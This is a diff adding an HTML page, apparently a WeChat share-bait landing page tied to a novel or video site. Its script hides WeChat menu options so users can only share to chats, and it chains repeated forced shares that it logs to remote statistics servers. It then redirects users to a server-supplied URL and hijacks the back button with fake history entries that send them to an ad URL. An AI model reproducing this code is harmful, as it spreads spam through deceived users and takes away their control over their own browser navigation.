@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8"/>
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+	<meta name="viewport"
+		  content="width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+	<meta content="yes" name="apple-mobile-web-app-capable"/>
+	<meta content="black" name="apple-mobile-web-app-status-bar-style"/>
+	<meta content="telephone=no" name="format-detection"/>
+	<meta content="email=no" name="format-detection"/>
+	<title>....</title>
+	<script type="text/javascript" src="./js/adaptive.js"></script>
+	<style>
+		@keyframes shake {
+			0%,
+			100% {
+				transform: translateX(0)
+			}
+
+			10% {
+				transform: translateX(-9px)
+			}
+
+			20% {
+				transform: translateX(8px)
+			}
+
+			30% {
+				transform: translateX(-7px)
+			}
+
+			40% {
+				transform: translateX(6px)
+			}
+
+			50% {
+				transform: translateX(-5px)
+			}
+
+			60% {
+				transform: translateX(4px)
+			}
+
+			70% {
+				transform: translateX(-3px)
+			}
+
+			80% {
+				transform: translateX(2px)
+			}
+
+			90% {
+				transform: translateX(-1px)
+			}
+		}
+
+		@keyframes shake2 {
+			0%,
+			100% {
+				transform: translateX(0)
+			}
+
+			10% {
+				transform: translateX(-9px)
+			}
+
+			20% {
+				transform: translateX(8px)
+			}
+
+			30% {
+				transform: translateX(-7px)
+			}
+
+			40% {
+				transform: translateX(6px)
+			}
+
+			50% {
+				transform: translateX(-5px)
+			}
+
+			60% {
+				transform: translateX(4px)
+			}
+
+			70% {
+				transform: translateX(-3px)
+			}
+
+			80% {
+				transform: translateX(2px)
+			}
+
+			90% {
+				transform: translateX(-1px)
+			}
+		}
+
+		.shake {
+			animation: shake 2s linear 0s 1
+		}
+
+		.shakeTwo {
+			animation: shake2 2s linear 0s 1
+		}
+	</style>
+</head>
+<body style="background: #000">
+<div style="text-align: center;width: 100%">
+	<img id="main" class="shake" style="float: right;width: 90vw">
+</div>
+<script type="text/javascript" src="https://res.wx.qq.com/open/js/jweixin-1.2.0.js"></script>
+<script type="text/javascript" src="./share/jquery-1.11.1.min.js"></script>
+<script>
+    var params = location.href.split('?')[1].split('#')[0]
+
+    var temp1 = params.split('&')
+    var temp2 = temp1.shift()
+    var newParams = temp1.join('&')
+    console.log(params)
+    console.log(newParams)
+
+    var obj = {}
+    var adUrl = ''
+    var gzhUrl = ''
+
+    $.post('http://xx1-new-lb.52xiaoshuo.cn/api/back/back_url', {
+        line_en: getParamUpdate('line_en'),
+        from: getParamUpdate('from') == null ? 0 : 1,
+    }, function (res) {
+        adUrl = res.data
+        gogg(adUrl);
+    }, 'json');
+
+
+    $(function () {
+        $.post('http://xx1-new-lb.52xiaoshuo.cn/api/share/share_info', {
+            url:encodeURI(location.href.split('#')[0]),
+            line_en: getParamUpdate('line_en'),
+            group_id:  getParamUpdate('group_id'),
+            v_id:  getParamUpdate('video_id'),
+            params:  'qudao=' + getParamUpdate('qudao') + '&uuid=' + getParamUpdate('uuid'),
+        }, function (res) {
+            if (typeof res.data != 'undefined' && typeof res.data.sign_info != 'undefined' && typeof res.data.share_info != 'undefined') {
+
+                sharedata = res.data.share_info;
+                gzhUrl = res.data.gzh_addr;
+                sharedataLength = res.data.share_info.length;
+
+                $('#main').attr('src', sharedata[0].share_background_img)
+
+                wx.config(res.data.sign_info);
+                wx.ready(function () {
+                    s0();
+                });
+            }
+        }, 'json');
+    })
+
+    function s0() {
+        wx.hideOptionMenu();
+        wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
+        wx.onMenuShareAppMessage({
+            title: sharedata[0].title,
+            desc: sharedata[0].desc,
+            link: sharedata[0].link,
+            imgUrl: sharedata[0].imgUrl,
+            type: 'video',
+            success: function () {
+                console.log(1111)
+                $('#main').removeClass('shakeTwo')
+                $('#main').addClass('shake')
+
+                $('#main').attr('src', sharedata[1].share_background_img)
+
+                if (sharedataLength > 1) {
+                    s1();
+                    tj_api_share(1);
+                    shareTj(1)
+
+                } else {
+                    after_share()
+                    shareTj(1)
+                }
+            }
+        });
+    }
+    function s1() {
+        wx.hideOptionMenu();
+        wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
+        wx.onMenuShareAppMessage({
+            title: sharedata[1].title,
+            desc: sharedata[1].desc,
+            link:sharedata[1].link,
+            imgUrl: sharedata[1].imgUrl,
+            type: 'video',
+            success: function () {
+                $('#main').removeClass('shake')
+                $('#main').addClass('shakeTwo')
+                console.log(1)
+
+                $('#main').attr('src', sharedata[2].share_background_img)
+                if (sharedataLength > 2) {
+                    s2();
+                    tj_api_share(1);
+                    shareTj(2)
+                } else {
+                    after_share()
+                    shareTj(2)
+                }
+
+            }
+        });
+    }
+    function s2() {
+        wx.hideOptionMenu();
+        wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
+        wx.onMenuShareAppMessage({
+            title: sharedata[2].title,
+            desc: sharedata[2].desc,
+            link: sharedata[2].link,
+            imgUrl: sharedata[2].imgUrl,
+            type: 'video',
+            success: function () {
+                $('#main').removeClass('shakeTwo')
+                $('#main').addClass('shake')
+
+                if (sharedataLength > 3) {
+                    $('#main').attr('src', sharedata[3].share_background_img)
+                    tj_api_share(2);
+                    shareTj(3)
+                    s3();
+                } else {
+                    after_share()
+                    shareTj(3)
+                }
+
+            }
+        });
+    }
+
+    function s3() {
+        wx.hideOptionMenu();
+        wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
+        wx.onMenuShareAppMessage({
+            title: sharedata[3].title,
+            desc: sharedata[3].desc,
+            link: sharedata[3].link,
+            imgUrl: sharedata[3].imgUrl,
+            type: 'video',
+            success: function () {
+                $('#main').removeClass('shake')
+                $('#main').addClass('shakeTwo')
+
+                if (sharedataLength > 4) {
+                    $('#main').attr('src', sharedata[4].share_background_img)
+                    tj_api_share(3);
+                    shareTj(4)
+                    s4();
+                } else {
+                    after_share()
+                    shareTj(4)
+                }
+
+            }
+        });
+    }
+
+    function s4() {
+        wx.hideOptionMenu();
+        wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
+        wx.onMenuShareAppMessage({
+            title: sharedata[4].title,
+            desc: sharedata[4].desc,
+            link: sharedata[4].link,
+            imgUrl: sharedata[4].imgUrl,
+            type: 'video',
+            success: function () {
+                $('#main').removeClass('shakeTwo')
+                $('#main').addClass('shake')
+
+                if (sharedataLength > 5) {
+                    $('#main').attr('src', sharedata[5].share_background_img)
+                    tj_api_share(4);
+                    shareTj(5)
+                    s5();
+                } else {
+                    after_share()
+                    shareTj(5)
+                }
+            }
+        });
+    }
+
+    function s5() {
+        wx.hideOptionMenu();
+        wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
+        wx.onMenuShareAppMessage({
+            title: sharedata[5].title,
+            desc: sharedata[5].desc,
+            link: sharedata[5].link,
+            imgUrl: sharedata[5].imgUrl,
+            type: 'video',
+            success: function () {
+                $('#main').removeClass('shake')
+                $('#main').addClass('shakeTwo')
+
+                if (sharedataLength > 6) {
+                    $('#main').attr('src', sharedata[6].share_background_img)
+                    tj_api_share(5);
+                    shareTj(6)
+                    s6();
+                } else {
+                    after_share()
+                    shareTj(6)
+                }
+            }
+        });
+    }
+
+    function s6() {
+        wx.hideOptionMenu();
+        wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
+        wx.onMenuShareAppMessage({
+            title: sharedata[6].title,
+            desc: sharedata[6].desc,
+            link: sharedata[6].link,
+            imgUrl: sharedata[6].imgUrl,
+            type: 'video',
+            success: function () {
+                $('#main').removeClass('shakeTwo')
+                $('#main').addClass('shake')
+
+                if (sharedataLength > 7) {
+                    $('#main').attr('src', sharedata[7].share_background_img)
+                    tj_api_share(6);
+                    shareTj(7)
+                    s7();
+                } else {
+                    after_share()
+                    shareTj(7)
+                }
+
+            }
+        });
+    }
+
+    function s7() {
+        wx.hideOptionMenu();
+        wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
+        wx.onMenuShareAppMessage({
+            title: sharedata[7].title,
+            desc: sharedata[7].desc,
+            link: sharedata[7].link,
+            imgUrl: sharedata[7].imgUrl,
+            type: 'video',
+            success: function () {
+                $('#main').removeClass('shake')
+                $('#main').addClass('shakeTwo')
+
+                if (sharedataLength > 8) {
+                    $('#main').attr('src', sharedata[8].share_background_img)
+                    tj_api_share(7);
+                    shareTj(8)
+                    s8();
+                } else {
+                    after_share()
+                    shareTj(8)
+                }
+            }
+        });
+    }
+
+    function after_share() {
+        location.href = gzhUrl
+    }
+
+    function tj_api_share(time) {
+        var e_lz = getParam('e_lz');
+        if (e_lz != '' && !getParam('from') && !getParam('fx') && !getParam('article')) {
+            var url = 'http://lzapi.qd2020.cn/stat/share_success/?e=' + e_lz + '&share_times=' + time;
+            var xml = new XMLHttpRequest;
+            xml.open("GET", url, true);
+            xml.send(null);
+        }
+
+        var uuid = getParam('uuid');
+        if (uuid != '' && !getParam('from') && !getParam('fx') && !getParam('article')) {
+            var url = 'https://1201025296535677.cn-beijing.fc.aliyuncs.com/2016-08-15/proxy/new_lz_share/new_lz_share/?uuid=' + uuid + '&share=' + time;
+            var xml = new XMLHttpRequest;
+            xml.open("GET", url, true);
+            xml.send(null);
+        }
+    }
+
+    function getParam(name) {
+        return location.href.match(new RegExp('[?&]' + name + '=([^?&#]+)', 'i')) ? decodeURIComponent(RegExp.$1) : '';
+    }
+
+
+    function gogg(url) {
+        history.pushState(history.length + 1, "message", window.location.href.split('#')[0] + "#" + new Date().getTime());
+        if (navigator.userAgent.indexOf('Android') != -1) {
+            if (typeof (tbsJs) != "undefined") {
+                tbsJs.onReady('{useCachedApi : "true"}', function (e) {
+                })
+                window.onhashchange = function () {
+                    location.href = url;
+                };
+            } else {
+                var pop = 0;
+                window.onhashchange = function (event) {
+                    pop++
+                    if (pop >= 3) {
+                        location.href = url;
+                    } else {
+                        history.go(1)
+                    }
+                };
+                history.go(-1);
+            }
+        } else {
+            window.onhashchange = function () {
+                location.href = url;
+            };
+        }
+    }
+
+
+    function shareTj(share_times) {
+        $.post('http://xx1-new-lb.52xiaoshuo.cn/api/stat/two-share', {
+            line_id: parseInt(getParamUpdate('line_id')),
+            channel_id: parseInt(getParamUpdate('channel_id')),
+            group_id: parseInt(getParamUpdate('group_id')),
+            video_id: parseInt(getParamUpdate('video_id')),
+            share_times: share_times
+        }, function (res) {
+            console.log(res)
+        }, 'json');
+    }
+
+    function getParamUpdate(name, url) { // 获取地址栏参数
+        if (typeof name !== 'string') return false
+        if (!url) url = window.location.href
+        // 当遇到name[xx]时，对方括号做一下转义为 name\[xxx\]，因为下面还需要使用name做正则
+        name = name.replace(/[\[\]]/g, '\\$&')
+        var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)')
+        var results = regex.exec(url)
+        if (!results) return null
+        if (!results[2]) return ''
+        return decodeURIComponent(results[2].replace(/\+/g, ' '))
+    }
+</script>
+<script>
+    var _hmt = _hmt || [];
+    (function() {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?fd96a5562b33806a0fd34e42974065f5";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+</body>
+</html>
